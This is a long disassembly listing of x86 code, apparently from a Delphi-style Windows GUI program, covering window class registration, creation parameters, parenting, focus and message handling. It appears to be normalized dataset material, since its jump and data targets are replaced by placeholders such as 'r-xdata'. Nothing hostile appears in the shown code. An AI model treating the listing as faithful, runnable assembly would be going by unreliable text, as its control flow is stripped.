mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x3
call sub_437f54
mov dl 0x4
call sub_437f54
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0xc ]
call sub_41369c
sub_43bd18
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_44f7bc
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
call sub_4534e0
sub_43bd38
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_437334
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_437334
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_437334
jmp r-xdata
mov [ ebx + 0x30 ] esi
sub_43bd84
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_43735c
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_43735c
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_43735c
jmp r-xdata
xor eax eax
mov [ ebx + 0x30 ] eax
pop esi
pop ebx
retn
sub_43bdcc
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_403454
push 0x1
mov esi ebx
mov ecx esi
mov edx 0xb02c
mov eax edi
call sub_439bf4
mov edx ebx
mov eax edi
call sub_43bd38
test [ ebx + 0x1c ] 0x2
jne r-xdata
push 0x1
mov ecx esi
mov edx 0xb036
mov eax edi
call sub_439bf4
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_439bf4
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_439bf4
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_439bf4
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_439bf4
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax edi
call sub_43f52c
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax ebx
call sub_439bf4
mov eax edi
call sub_43c91c
jmp r-xdata
mov edx ebx
mov eax edi
call sub_43ba2c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43bea0
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
push 0x0
mov edi ebx
mov ecx edi
mov edx 0xb036
mov eax esi
call sub_439bf4
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax esi
call sub_43f52c
test al al
je r-xdata
mov dl 0x1
mov ebp ebx
mov eax ebp
call sub_43bd18
mov eax ebp
call sub_43c780
jmp r-xdata
mov edx ebx
mov eax esi
call sub_43bd84
push 0x0
mov ecx edi
mov edx 0xb02c
mov eax esi
call sub_439bf4
mov eax esi
call sub_43bae8
pop ebp
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_438e88
sub_43bf1c
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov ebp [ ebx + 0x198 ]
test ebp ebp
je r-xdata
xor esi esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
mov edx edi
sub edx esi
mov eax [ ebx + 0x19c ]
call sub_4137ac
mov edx edi
mov eax ebp
call sub_4137ac
jmp r-xdata
cmp esi edi
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_43bf78
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esp ]
call sub_43bf58
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_43bf1c
mov ebp eax
mov edx esi
mov eax [ ebp + 0x3c ]
call [ ebp + 0x38 ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
sub_43bfb8
add esp 0xfffffff0
movzx edx dx
mov [ esp ] edx
xor edx edx
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
call sub_43bf78
add esp 0x10
retn
sub_43bfe0
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x34 ]
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
mov [ ebx + 0x34 ] edi
mov eax [ ebx + 0x24 ]
and eax 0xffffbf1f
or eax 0x3
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0x24 ]
push eax
push esi
push 0x0
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ ebx + 0x34 ]
push eax
call GetClassInfoA
sub_43c04c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_439084
test al al
je r-xdata
mov eax ebx
call sub_4390b4
test al al
je r-xdata
or [ edi ] 0x2000
mov eax ebx
mov si 0xffc8
call sub_403454
test al al
je r-xdata
or [ edi ] 0x4000
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffca
call sub_403454
test al al
jne r-xdata
mov eax ebx
mov si 0xffca
call sub_403454
cmp al 0x1
jne r-xdata
or [ edi ] 0x1000
jmp r-xdata
or [ edi ] 0x0
sub_43c0b4
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_43c1d2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
xor ecx ecx
mov edx 0x8c
call sub_402c64
mov eax [ esi + 0x64 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] 0x44000000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_43c04c
test [ esi + 0x50 ] 0x1
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
or [ ebx + 0x4 ] 0x2000000
or [ ebx + 0x8 ] 0x10000
cmp [ esi + 0x1a4 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ esi + 0x40 ]
mov [ ebx + 0xc ] eax
mov eax [ esi + 0x44 ]
mov [ ebx + 0x10 ] eax
mov eax [ esi + 0x48 ]
mov [ ebx + 0x14 ] eax
mov eax [ esi + 0x4c ]
mov [ ebx + 0x18 ] eax
mov edi [ esi + 0x30 ]
test edi edi
je r-xdata
or [ ebx + 0x4 ] 0x10000
or [ ebx + 0x4 ] 0x8000000
mov eax [ esi + 0x190 ]
mov [ ebx + 0x1c ] eax
mov eax edi
call sub_43f228
mov [ ebx + 0x1c ] eax
jmp r-xdata
mov [ ebx + 0x24 ] 0xb
mov eax DefWindowProcA
mov [ ebx + 0x28 ] eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebx + 0x3c ] eax
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x34 ] eax
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_4031a8
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4041f4
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4c ]
call sub_4083d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c1d9
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
sub_43c1e0
push ebp
mov ebp esp
add esp 0xffffff40
push ebx
push esi
xor edx edx
mov [ ebp - 0xc0 ] edx
mov esi eax
xor eax eax
push ebp
push sub_43c3a1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x98 ]
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ esi + 0x174 ] eax
lea eax [ ebp - 0xb4 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test [ ebp - 0x85 ] 0x40
je r-xdata
test al al
je r-xdata
mov edx sub_435834
cmp edx [ ebp - 0xb0 ]
je r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x64 ] sub_435834
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x68 ]
push eax
call RegisterClassA
test ax ax
jne r-xdata
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call UnregisterClassA
mov [ rw-data ] esi
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x9c ]
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xb8 ] 0xb
lea eax [ ebp - 0xbc ]
push eax
push 0x0
lea edx [ ebp - 0xc0 ]
mov eax [ rw-data ]
call sub_405a90
mov ecx [ ebp - 0xc0 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2c0
call sub_4039cc
test [ ebx + 0x1c ] 0x2
je r-xdata
call sub_40c608
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
call sub_40c608
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax [ esi + 0x64 ]
call sub_408574
xor eax eax
mov [ esi + 0x64 ] eax
mov eax esi
call sub_43f538
push 0x1
mov eax [ esi + 0x68 ]
call sub_41c1f8
mov ecx eax
mov edx 0x30
mov eax esi
call sub_439bf4
cmp [ esi + 0x5c ] 0x0
je r-xdata
push 0xfffffff4
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax ebx
call sub_43f228
mov [ ebp - 0x70 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c3a8
lea eax [ ebp - 0xc0 ]
call sub_403f90
retn
mov eax esi
mov si 0xffee
call sub_403454
mov eax [ esi + 0x180 ]
push eax
push 0xfffffff4
push eax
call SetWindowLongA
sub_43c3b0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx [ ebx ]
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_4068e4
mov [ esi + 0x180 ] eax
pop esi
pop ebx
retn
sub_43c3f0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4175dc
mov eax esi
call sub_41752c
mov [ ebx + 0x1fa ] eax
mov eax esi
call sub_41752c
mov [ ebx + 0x1fe ] eax
or [ ebx + 0x98 ] 0x20
mov eax esi
call sub_4175e4
pop esi
pop ebx
retn
sub_43c428
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ ebx + 0x1fa ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x1fe ] eax
mov eax esi
call sub_418e28
mov edx [ ebx + 0x1fa ]
mov eax esi
call sub_418db4
mov edx [ ebx + 0x1fe ]
mov eax esi
call sub_418db4
mov eax esi
call sub_418e30
add esp 0x10
pop esi
pop ebx
retn
sub_43c490
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebx + 0x1fa ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x1fa
call sub_43c47c
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0x1 ] 0x0
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_4137ac
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_4137ac
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
sub_43c568
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_439f2c
mov eax [ ebp - 0x8 ]
push eax
push sub_43c3f0
mov eax [ ebp - 0x8 ]
push eax
push sub_43c428
push ebp
call sub_43c490
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43c5c4
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_4389b4
mov esi eax
cmp esi 0x1
jge r-xdata
lea eax [ esi + 0x1 ]
call sub_408528
mov edi eax
mov [ ebx + 0x64 ] edi
mov eax edi
call sub_40853c
mov ecx eax
mov edx edi
mov eax ebx
call sub_4389c4
mov eax r-xdata
call sub_408548
mov [ ebx + 0x64 ] eax
jmp r-xdata
call sub_437468
mov eax ebx
mov edx [ eax ]
call [ edx + 0xac ]
pop edi
pop esi
pop ebx
retn
sub_43c61c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x200
xor eax eax
push ebp
push sub_43c669
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
push eax
call DestroyWindow
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c670
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfdff
retn
call sub_40c608
sub_43c680
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ edi + 0x19c ]
mov edx ebx
call sub_413808
mov esi eax
inc esi
mov eax [ edi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
sub ebx esi
jl r-xdata
xor eax eax
inc ebx
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x19c ]
mov edx esi
call sub_4137ac
mov eax [ eax + 0x180 ]
test eax eax
jne r-xdata
sub_43c6c8
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xa0 ]
mov esi ebx
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov eax ebx
call sub_43bf58
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
mov edx ebx
mov eax esi
call sub_43c680
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_43bf1c
call sub_438094
inc edi
dec esi
jne r-xdata
sub_43c764
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x14
sub_43c780
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xb0 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x19c ]
call sub_4137ac
call sub_43c780
inc edi
dec esi
jne r-xdata
sub_43c7e0
push ebx
push esi
push edi
mov edi eax
mov eax edi
mov si 0xffb5
call sub_403454
mov ebx eax
mov eax edi
call sub_43c780
mov eax edi
call sub_43c91c
test bl bl
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov eax [ edi + 0x180 ]
push eax
call SetFocus
sub_43c820
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
jne r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a6 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x94 ]
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x1a6 ] dl
xor eax eax
push ebp
push sub_43c8f6
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ ebp - 0x4 ]
call sub_439bf4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_4137ac
call sub_43c820
inc esi
dec ebx
jne r-xdata
sub_43c91c
push ebx
push esi
mov esi eax
mov ebx esi
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_43c820
cmp [ ebx + 0x190 ] 0x0
je r-xdata
sub_43c95c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp esi [ ebx + 0x190 ]
je r-xdata
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax ebx
call sub_43c780
mov [ ebx + 0x190 ] esi
cmp [ ebx + 0x190 ] 0x0
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x190 ] esi
push esi
mov eax [ ebx + 0x180 ]
push eax
call SetParent
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax ebx
call sub_43c91c
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
push 0x0
mov dx 0x3
mov ax 0x3
call sub_4068cc
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_439bf4
jmp r-xdata
sub_43c9e4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43ca3c
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_43ca2b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ca32
call sub_437468
call sub_41ed6c
retn
sub_43ca5c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
sub eax [ ebx + 0x40 ]
call sub_412350
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax - 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
push [ eax - 0x8 ]
push [ eax - 0xc ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] ebx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov al 0x1
test [ ebx + 0x51 ] 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff4
call sub_4068b4
push eax
xor ecx ecx
mov edx 0xb00a
mov eax ebx
call sub_439bf4
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xd ] 0x0
je r-xdata
sub_43cb14
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0xd ] cl
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x19c ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x19c ]
call sub_4137ac
call sub_43ca5c
pop ecx
test al al
jne r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x198 ]
call sub_4137ac
call sub_43ca5c
pop ecx
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_43cba8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_43f228
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_4068a0
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_43cb14
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
sub eax [ ebx + 0x40 ]
mov [ esp ] eax
movsx eax [ esi + 0xa ]
sub eax [ ebx + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_4068b4
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax ebx
call sub_439bf4
mov [ esi + 0xc ] eax
mov al 0x1
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
xor eax eax
test ebx ebx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
sub_43cc3c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi ]
cmp eax 0x84
jg r-xdata
add eax 0xffffff00
sub eax 0x9
jb r-xdata
je r-xdata
mov eax ebx
call sub_4391b0
test al al
jne r-xdata
add eax 0xffffff09
sub eax 0xb
jb r-xdata
mov edx esi
mov eax ebx
call sub_439cc0
cmp [ esi + 0xc ] 0xffffffff
jne r-xdata
sub eax 0x7
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov edx esi
mov eax ebx
call sub_43cba8
test al al
je r-xdata
jmp r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_4068a0
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_438584
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_43cb14
test eax eax
je r-xdata
mov eax ebx
call sub_44f7bc
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov edx esi
mov eax ebx
call sub_439cc0
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
je r-xdata
test [ ebx + 0x54 ] 0x20
jne r-xdata
sub eax 0x17
je r-xdata
mov eax ebx
call sub_43f52c
test al al
je r-xdata
jmp r-xdata
jmp r-xdata
mov eax ebx
call sub_43f228
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_43f228
push eax
call DefWindowProcA
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0x1f
mov eax [ rw-data ]
call sub_439bf4
sub_43cda0
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_439e54
mov edi [ ebx ]
cmp edi 0x7b
jne r-xdata
mov edi [ ebx ]
mov eax edi
add eax 0xfffffece
sub eax 0x7
jb r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov ebp [ ebx + 0x8 ]
push ebp
mov eax [ ebx + 0x4 ]
push eax
add edi 0xbc00
push edi
push ebp
call SendMessageA
mov [ ebx + 0xc ] eax
jmp r-xdata
add eax 0xffff4407
sub eax 0x7
jb r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx edi
mov eax [ esi + 0x30 ]
call sub_439bf4
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
mov eax [ ebx ]
cmp eax 0xc
jne r-xdata
mov eax [ esi + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_41bd24
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax [ esi + 0x170 ]
call sub_41c9a8
call sub_41bd24
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ esi + 0x170 ]
call sub_41c9e4
mov [ ebx + 0xc ] eax
jmp r-xdata
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_4385e0
jmp r-xdata
cmp edi [ rw-data ]
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push edi
mov eax [ esi + 0x180 ]
push eax
mov eax [ esi + 0x174 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] esi
jmp r-xdata
sub_43cea8
push ebx
push esi
push edi
mov esi edx
xor ebx ebx
call sub_435920
mov edi eax
test edi edi
je r-xdata
